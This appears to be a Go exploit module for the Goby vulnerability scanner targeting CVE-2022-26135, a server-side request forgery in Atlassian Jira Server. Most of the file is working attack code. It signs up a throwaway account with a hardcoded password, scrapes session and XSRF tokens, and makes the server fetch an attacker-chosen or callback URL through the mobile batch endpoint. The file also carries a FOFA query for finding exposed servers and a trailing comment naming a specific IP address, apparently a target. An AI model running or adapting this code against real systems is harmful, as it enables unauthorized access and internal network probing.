package exploits

import (
  "fmt"
  "git.gobies.org/goby/goscanner/godclient"
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "regexp"
  "strings"
  "time"
)

func init() {
  expJson := `{
    "Name": "Jira Server SSRF (CVE-2022-26135)",
    "Description": "<p>Atlassian JIRA Server is a server version of a defect tracking management system developed by Atlassian in Australia. The system is mainly used to track and manage various problems and defects in the work.</p><p>A security vulnerability exists in Atlassian Jira Server. An attacker exploits this vulnerability to perform a server-side request forgery attack via a batch endpoint.</p>",
    "Product": "Jira",
    "Homepage": "https://jira.atlassian.com",
    "DisclosureDate": "2022-07-07",
    "Author": "1291904552@qq.com",
    "FofaQuery": "body=\"Signup!default.jspa\"",
    "GobyQuery": "body=\"Signup!default.jspa\"",
    "Level": "2",
    "Impact": "<p>A security vulnerability exists in Atlassian Jira Server. An attacker exploits this vulnerability to perform a server-side request forgery attack via a batch endpoint.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://jira.atlassian.com/browse/JRASERVER-73863\">https://jira.atlassian.com/browse/JRASERVER-73863</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Translation": {
        "CN": {
            "Name": "Jira Server 服务端请求伪造 (CVE-2022-26135)",
            "Product": "Jira",
            "Description": "<p>Atlassian JIRA Server是澳大利亚Atlassian公司的一套缺陷跟踪管理系统的服务器版本。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。</p><p>Atlassian Jira Server 存在安全漏洞。攻击者利用该漏洞通过批处理端点执行服务器端请求伪造攻击。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://jira.atlassian.com/browse/JRASERVER-73863\">https://jira.atlassian.com/browse/JRASERVER-73863</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>Atlassian Jira Server 存在安全漏洞。攻击者利用该漏洞通过批处理端点执行服务器端请求伪造攻击。</p>",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Jira Server SSRF (CVE-2022-26135)",
            "Product": "Jira",
            "Description": "<p>Atlassian JIRA Server is a server version of a defect tracking management system developed by Atlassian in Australia. The system is mainly used to track and manage various problems and defects in the work.</p><p>A security vulnerability exists in Atlassian Jira Server. An attacker exploits this vulnerability to perform a server-side request forgery attack via a batch endpoint.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://jira.atlassian.com/browse/JRASERVER-73863\">https://jira.atlassian.com/browse/JRASERVER-73863</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>A security vulnerability exists in Atlassian Jira Server. An attacker exploits this vulnerability to perform a server-side request forgery attack via a batch endpoint.</p>",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "xxx.dnslog.cm"
        }
    ],
    "ExpTips": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "CVEIDs": [
        "CVE-2022-26135"
    ],
    "CVSSScore": "7.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "CNNVD": [
        "CNNVD-202206-2858"
    ],
    "CNVD": [],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "PocId": "10692"
}`


  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

      uri1 := "/secure/Signup!default.jspa"
      cfg1 := httpclient.NewGetRequestConfig(uri1)
      cfg1.VerifyTls = false
      cfg1.FollowRedirect = false
      if resp, err := httpclient.DoHttpRequest(u, cfg1); err == nil && strings.Contains(resp.RawBody,"atlassian-token"){

        atlassianToken :=regexp.MustCompile("name=\"atlassian-token\" content=\"(.*?)\">").FindStringSubmatch(resp.RawBody)
        JSESSIONID :=regexp.MustCompile("Set-Cookie: JSESSIONID=(.*?);").FindStringSubmatch(resp.HeaderString.String())

        RandName := goutils.RandomHexString(6)
        uri2 := "/secure/Signup.jspa"
        cfg2 := httpclient.NewPostRequestConfig(uri2)
        cfg2.VerifyTls = false
        cfg2.FollowRedirect = false
        cfg2.Header.Store("Content-Type","application/x-www-form-urlencoded")
        cfg2.Header.Store("Cookie","JSESSIONID="+JSESSIONID[1]+"; atlassian.xsrf.token="+atlassianToken[1])
        cfg2.Data = fmt.Sprintf(`email=%s%%40gmail.com&fullname=%s%%40gmail.com&username=%s&password=9QWP7zyvfa4nJU9QKu%%2AYt8_QzbP&Signup=Sign+up&atl_token=%s`,RandName,RandName,RandName,atlassianToken[1])
        if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil && resp2.StatusCode == 200{
          uri3 := "/login.jsp"
          cfg3 := httpclient.NewPostRequestConfig(uri3)
          cfg3.VerifyTls = false
          cfg3.FollowRedirect = false
          cfg3.Header.Store("Content-Type","application/x-www-form-urlencoded")
          cfg3.Header.Store("Cookie","JSESSIONID="+JSESSIONID[1]+"; atlassian.xsrf.token="+atlassianToken[1])
          cfg3.Data = fmt.Sprintf(`os_username=%s&os_password=9QWP7zyvfa4nJU9QKu%%2AYt8_QzbP&os_destination=&user_role=&atl_token=&login=Log+In`,RandName)
          if resp3, err := httpclient.DoHttpRequest(u, cfg3); err == nil &&resp3.StatusCode == 302 &&strings.Contains(resp3.HeaderString.String(),"Set-Cookie: JSESSIONID="){
            JSESSIONID2 := regexp.MustCompile("Set-Cookie: JSESSIONID=(.*?);").FindStringSubmatch(resp3.HeaderString.String())
            uri4 := "/"
            cfg4 := httpclient.NewPostRequestConfig(uri4)
            cfg4.VerifyTls = false
            cfg4.FollowRedirect = false
            cfg4.Header.Store("Content-Type","application/x-www-form-urlencoded")
            cfg4.Header.Store("Cookie","JSESSIONID="+JSESSIONID2[1]+"; atlassian.xsrf.token="+atlassianToken[1])
            if resp4, err := httpclient.DoHttpRequest(u, cfg4); err == nil && strings.Contains(resp4.HeaderString.String(),"Set-Cookie: atlassian.xsrf.token="){
              atlassianToken2 := regexp.MustCompile("Set-Cookie: atlassian\\.xsrf\\.token=(.*?);").FindStringSubmatch(resp4.HeaderString.String())
              //Godserver
              checkStr := goutils.RandomHexString(4)
              checkUrl, _ := godclient.GetGodCheckURL(checkStr)
              uri5 := "/rest/nativemobile/1.0/batch"
              cfg5 := httpclient.NewPostRequestConfig(uri5)
              cfg5.VerifyTls = false
              cfg5.FollowRedirect = false
              cfg5.Header.Store("Referer",u.FixedHostInfo+"/servicedesk/customer/portal/1/user/signup")
              cfg5.Header.Store("Content-Type","application/json")
              cfg5.Header.Store("Cookie","JSESSIONID="+JSESSIONID2[1]+"; atlassian.xsrf.token="+atlassianToken2[1])
              cfg5.Data = fmt.Sprintf(`{"requests":[{"method":"GET","location":"@%s"}]}`,checkUrl)
              if resp5, err := httpclient.DoHttpRequest(u, cfg5); err == nil && resp5.StatusCode == 200 {
                return godclient.PullExists(checkStr, time.Second*10)
              }

            }

          }

        }
      }
      return false
    },
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      cmd := ss.Params["cmd"].(string)

      uri1 := "/secure/Signup!default.jspa"
      cfg1 := httpclient.NewGetRequestConfig(uri1)
      cfg1.VerifyTls = false
      cfg1.FollowRedirect = false
      if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil && strings.Contains(resp.RawBody,"atlassian-token"){

        atlassianToken :=regexp.MustCompile("name=\"atlassian-token\" content=\"(.*?)\">").FindStringSubmatch(resp.RawBody)
        JSESSIONID :=regexp.MustCompile("Set-Cookie: JSESSIONID=(.*?);").FindStringSubmatch(resp.HeaderString.String())

        RandName := goutils.RandomHexString(6)
        uri2 := "/secure/Signup.jspa"
        cfg2 := httpclient.NewPostRequestConfig(uri2)
        cfg2.VerifyTls = false
        cfg2.FollowRedirect = false
        cfg2.Header.Store("Content-Type","application/x-www-form-urlencoded")
        cfg2.Header.Store("Cookie","JSESSIONID="+JSESSIONID[1]+"; atlassian.xsrf.token="+atlassianToken[1])
        cfg2.Data = fmt.Sprintf(`email=%s%%40gmail.com&fullname=%s%%40gmail.com&username=%s&password=9QWP7zyvfa4nJU9QKu%%2AYt8_QzbP&Signup=Sign+up&atl_token=%s`,RandName,RandName,RandName,atlassianToken[1])
        if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil && resp2.StatusCode == 200{
          uri3 := "/login.jsp"
          cfg3 := httpclient.NewPostRequestConfig(uri3)
          cfg3.VerifyTls = false
          cfg3.FollowRedirect = false
          cfg3.Header.Store("Content-Type","application/x-www-form-urlencoded")
          cfg3.Header.Store("Cookie","JSESSIONID="+JSESSIONID[1]+"; atlassian.xsrf.token="+atlassianToken[1])
          cfg3.Data = fmt.Sprintf(`os_username=%s&os_password=9QWP7zyvfa4nJU9QKu%%2AYt8_QzbP&os_destination=&user_role=&atl_token=&login=Log+In`,RandName)
          if resp3, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg3); err == nil &&resp3.StatusCode == 302 &&strings.Contains(resp3.HeaderString.String(),"Set-Cookie: JSESSIONID="){
            JSESSIONID2 := regexp.MustCompile("Set-Cookie: JSESSIONID=(.*?);").FindStringSubmatch(resp3.HeaderString.String())
            uri4 := "/"
            cfg4 := httpclient.NewPostRequestConfig(uri4)
            cfg4.VerifyTls = false
            cfg4.FollowRedirect = false
            cfg4.Header.Store("Content-Type","application/x-www-form-urlencoded")
            cfg4.Header.Store("Cookie","JSESSIONID="+JSESSIONID2[1]+"; atlassian.xsrf.token="+atlassianToken[1])
            if resp4, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg4); err == nil && strings.Contains(resp4.HeaderString.String(),"Set-Cookie: atlassian.xsrf.token="){
              atlassianToken2 := regexp.MustCompile("Set-Cookie: atlassian\\.xsrf\\.token=(.*?);").FindStringSubmatch(resp4.HeaderString.String())
              uri5 := "/rest/nativemobile/1.0/batch"
              cfg5 := httpclient.NewPostRequestConfig(uri5)
              cfg5.VerifyTls = false
              cfg5.FollowRedirect = false
              cfg5.Header.Store("Referer",expResult.HostInfo.FixedHostInfo+"/servicedesk/customer/portal/1/user/signup")
              cfg5.Header.Store("Content-Type","application/json")
              cfg5.Header.Store("Cookie","JSESSIONID="+JSESSIONID2[1]+"; atlassian.xsrf.token="+atlassianToken2[1])
              cfg5.Data = fmt.Sprintf(`{"requests":[{"method":"GET","location":"@%s"}]}`,cmd)
              if resp5, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg5); err == nil && resp5.StatusCode == 200 {
                expResult.Output = resp.RawBody
                expResult.Success = true
              }

            }

          }

        }
      }
      return expResult
    },
  ))
}
//http://47.94.138.142:8080